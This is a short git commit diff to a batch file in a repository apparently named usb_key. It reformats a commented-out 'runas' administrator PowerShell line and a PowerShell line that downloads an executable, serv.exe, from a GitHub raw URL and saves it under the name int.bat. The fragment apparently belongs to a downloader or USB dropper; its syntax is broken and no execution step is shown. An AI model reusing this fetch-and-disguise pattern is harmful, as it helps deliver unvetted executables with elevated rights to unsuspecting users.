50cf909625f64e7cab1b114755291db227bf74ac
djbrunoprod <58257756+djbrunoprod@users.noreply.github.com>
2023-11-19 04:43:57 -0300

    Update int.bat

--- int.bat
+++ int.bat
@@ -1,3 +1,4 @@
-## runas /user:administrator powershell.exe
-$client.DownloadFile(\"https://raw.githubusercontent.com/djbrunoprod/usb_key/main/serv.exe\" , \"int.bat\
+REM runas /user:administrator powershell.exe
+
+$client.DownloadFile("https://raw.githubusercontent.com/djbrunoprod/usb_key/main/serv.exe" , "int.bat"
 
